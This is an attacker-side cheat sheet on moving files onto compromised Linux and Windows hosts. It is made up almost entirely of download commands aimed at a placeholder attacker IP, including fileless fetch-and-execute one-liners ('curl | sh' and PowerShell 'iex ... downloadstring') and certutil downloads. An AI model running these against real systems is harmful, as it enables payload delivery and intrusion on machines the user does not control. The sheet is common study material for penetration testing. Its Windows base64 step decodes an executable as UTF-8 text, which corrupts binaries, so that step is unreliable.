
# File Transfers

---

## Serve Files from Attacker Machine

```bash
# Navigate to the directory containing the file first
python3 -m http.server 80
```

---

## Linux — Download to Target

```bash
# wget
wget http://<attacker-ip>/file.sh

# curl
curl http://<attacker-ip>/file.sh -o file.sh

# In-memory execution (no file written to disk)
curl http://<attacker-ip>/file.sh | sh
```

**SCP** — requires SSH credentials on target
```bash
scp file.sh user@<target>:/tmp/file.sh
```

**Base64** — useful when outbound HTTP is blocked
```bash
# On attacker — encode
base64 file -w 0

# On target — decode
echo "<base64string>" | base64 -d > file
```

---

## Windows — Download to Target

```powershell
# PowerShell - Invoke-WebRequest
iwr -uri http://<attacker-ip>/file.exe -outfile file.exe

# certutil (reliable on older systems)
certutil -urlcache -split -f http://<attacker-ip>/file.exe file.exe

# In-memory execution (no file written to disk)
iex(new-object net.webclient).downloadstring('http://<attacker-ip>/file.ps1')
```

**Base64** — useful when outbound HTTP is blocked
```powershell
# On attacker — encode
base64 file -w 0

# On target — decode and write
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<base64string>")) | Set-Content file.exe
```

---

## Validate Transfer Integrity

Always verify the file wasn't corrupted, especially after base64 transfers.

```bash
# Get hash on attacker machine
md5sum file

# Confirm hash matches on target
md5sum file
```

```bash
# Check file type is correct
file shell
# e.g. shell: ELF 64-bit LSB executable
```

```powershell
# Windows
Get-FileHash file.exe -Algorithm MD5
```
